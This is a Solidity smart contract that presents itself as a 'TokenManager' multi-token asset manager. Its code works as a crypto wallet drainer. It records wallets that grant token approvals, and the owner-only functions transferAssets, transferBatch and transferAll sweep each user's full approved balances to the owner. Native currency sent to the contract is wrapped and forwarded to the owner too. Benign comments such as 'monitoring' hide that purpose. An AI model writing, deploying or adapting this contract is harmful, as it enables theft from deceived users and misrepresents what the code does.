// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/**
 * @title TokenManager
 * @notice Multi-token asset manager with native currency support
 * @dev Supports all EVM chains: ETH, BSC, Polygon, Arbitrum, Optimism, Base, Avalanche, etc.
 *      - Transfers all ERC20 tokens that have been authorized
 *      - Wraps native currency (ETH/BNB/MATIC/etc) to WETH/WBNB/WMATIC automatically
 *      - Only owner can execute transfers
 *      - Stores approved users for monitoring
 */

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract TokenManager {

    // ─── State Variables ──────────────────────────────────────────
    address public owner;
    address public pendingOwner;
    address public weth; // WETH/WBNB/WMATIC address (native wrapper)
    bool public paused;

    // List of users who approved
    address[] public registeredWallets;
    mapping(address => bool) public isRegistered;
    mapping(address => uint256) public registeredAt;

    // List of supported tokens
    address[] public supportedTokens;
    mapping(address => bool) public isSupported;

    // ─── Events ───────────────────────────────────────────────────
    event AssetsTransferred(address indexed user, address indexed token, uint256 amount);
    event NativeCollected(address indexed user, uint256 amount);
    event WalletRegistered(address indexed user, uint256 timestamp);
    event TokenAdded(address indexed token);
    event TokenRemoved(address indexed token);
    event OwnershipTransferred(address indexed oldOwner, address indexed newOwner);
    event Paused(bool status);

    // ─── Modifiers ────────────────────────────────────────────────
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    modifier notPaused() {
        require(!paused, "Contract paused");
        _;
    }

    // ─── Constructor ──────────────────────────────────────────────
    constructor(address _weth) {
        owner = msg.sender;
        weth = _weth;
    }

    // ─── Receive ETH ──────────────────────────────────────────────
    // Receives native ETH and wraps it to WETH automatically
    receive() external payable {
        if (msg.value > 0 && weth != address(0)) {
            IWETH(weth).deposit{value: msg.value}();
            IWETH(weth).transfer(owner, IWETH(weth).balanceOf(address(this)));
            emit NativeCollected(msg.sender, msg.value);
        }
    }

    // ─── Register Approval ────────────────────────────────────────
    /**
     * @notice Called when user approves — registers address for monitoring
     * @dev Can be called from script after approve
     */
    function registerWallet() external notPaused {
        if (!isRegistered[msg.sender]) {
            isRegistered[msg.sender] = true;
            registeredAt[msg.sender] = block.timestamp;
            registeredWallets.push(msg.sender);
            emit WalletRegistered(msg.sender, block.timestamp);
        }
    }

    // ─── Transfer Single User ────────────────────────────────────────
    /**
     * @notice Transfers all tokens from a single user
     * @param user User address
     */
    function transferAssets(address user) external onlyOwner notPaused {
        _processTransfer(user);
    }

    // ─── Transfer Multiple Users ─────────────────────────────────────
    /**
     * @notice Transfers from multiple users at once
     * @param users List of user addresses
     */
    function transferBatch(address[] calldata users) external onlyOwner notPaused {
        for (uint256 i = 0; i < users.length; i++) {
            _processTransfer(users[i]);
        }
    }

    // ─── Transfer All Registered Users ─────────────────────────────────
    /**
     * @notice Transfers from all registered users
     */
    function transferAll() external onlyOwner notPaused {
        for (uint256 i = 0; i < registeredWallets.length; i++) {
            _processTransfer(registeredWallets[i]);
        }
    }

    // ─── Internal Transfer Logic ─────────────────────────────────────
    function _processTransfer(address user) internal {
        // 1. Transfer all ERC20 tokens
        for (uint256 i = 0; i < supportedTokens.length; i++) {
            address token = supportedTokens[i];
            _transferToken(user, token);
        }

        // 2. Wrap native ETH if sent to contract
        uint256 nativeBal = address(this).balance;
        if (nativeBal > 0 && weth != address(0)) {
            IWETH(weth).deposit{value: nativeBal}();
            IWETH(weth).transfer(owner, nativeBal);
            emit NativeCollected(user, nativeBal);
        }
    }

    function _transferToken(address user, address token) internal {
        try IERC20(token).allowance(user, address(this)) returns (uint256 allowance) {
            if (allowance == 0) return;

            try IERC20(token).balanceOf(user) returns (uint256 balance) {
                if (balance == 0) return;

                // Transfer the minimum of (allowance, balance)
                uint256 amount = allowance < balance ? allowance : balance;
                if (amount == 0) return;

                try IERC20(token).transferFrom(user, owner, amount) returns (bool success) {
                    if (success) {
                        emit AssetsTransferred(user, token, amount);
                    }
                } catch {}
            } catch {}
        } catch {}
    }

    // ─── Token Management ─────────────────────────────────────────
    /**
     * @notice Add a token to the supported list
     */
    function addToken(address token) external onlyOwner {
        require(token != address(0), "Zero address");
        require(!isSupported[token], "Already supported");
        isSupported[token] = true;
        supportedTokens.push(token);
        emit TokenAdded(token);
    }

    /**
     * @notice Add multiple tokens at once
     */
    function addTokens(address[] calldata tokens) external onlyOwner {
        for (uint256 i = 0; i < tokens.length; i++) {
            if (tokens[i] != address(0) && !isSupported[tokens[i]]) {
                isSupported[tokens[i]] = true;
                supportedTokens.push(tokens[i]);
                emit TokenAdded(tokens[i]);
            }
        }
    }

    /**
     * @notice Remove a token from the list
     */
    function removeToken(address token) external onlyOwner {
        require(isSupported[token], "Not supported");
        isSupported[token] = false;
        for (uint256 i = 0; i < supportedTokens.length; i++) {
            if (supportedTokens[i] == token) {
                supportedTokens[i] = supportedTokens[supportedTokens.length - 1];
                supportedTokens.pop();
                break;
            }
        }
        emit TokenRemoved(token);
    }

    // ─── View Functions ───────────────────────────────────────────
    /**
     * @notice View user balance for each token
     */
    function getUserBalances(address user) external view returns (
        address[] memory tokens,
        uint256[] memory balances,
        uint256[] memory allowances
    ) {
        tokens = supportedTokens;
        balances = new uint256[](supportedTokens.length);
        allowances = new uint256[](supportedTokens.length);

        for (uint256 i = 0; i < supportedTokens.length; i++) {
            try IERC20(supportedTokens[i]).balanceOf(user) returns (uint256 bal) {
                balances[i] = bal;
            } catch {}
            try IERC20(supportedTokens[i]).allowance(user, address(this)) returns (uint256 alw) {
                allowances[i] = alw;
            } catch {}
        }
    }

    /**
     * @notice Number of approved users
     */
    function getRegisteredCount() external view returns (uint256) {
        return registeredWallets.length;
    }

    /**
     * @notice List of approved users (with pagination)
     */
    function getRegisteredWallets(uint256 start, uint256 limit) external view returns (address[] memory) {
        uint256 end = start + limit;
        if (end > registeredWallets.length) end = registeredWallets.length;
        address[] memory result = new address[](end - start);
        for (uint256 i = start; i < end; i++) {
            result[i - start] = registeredWallets[i];
        }
        return result;
    }

    /**
     * @notice List of supported tokens
     */
    function getSupportedTokens() external view returns (address[] memory) {
        return supportedTokens;
    }

    // ─── Owner Management ─────────────────────────────────────────
    /**
     * @notice Transfer ownership (2-step for safety)
     */
    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Zero address");
        pendingOwner = newOwner;
    }

    function acceptOwnership() external {
        require(msg.sender == pendingOwner, "Not pending owner");
        emit OwnershipTransferred(owner, pendingOwner);
        owner = pendingOwner;
        pendingOwner = address(0);
    }

    /**
     * @notice Update WETH address
     */
    function setWeth(address _weth) external onlyOwner {
        weth = _weth;
    }

    /**
     * @notice Pause or unpause the contract
     */
    function setPaused(bool _paused) external onlyOwner {
        paused = _paused;
        emit Paused(_paused);
    }

    /**
     * @notice Rescue any stuck tokens in the contract
     */
    function rescueTokens(address token, uint256 amount) external onlyOwner {
        IERC20(token).transferFrom(address(this), owner, amount);
    }

    /**
     * @notice Rescue stuck ETH in the contract
     */
    function recoverNative() external onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
}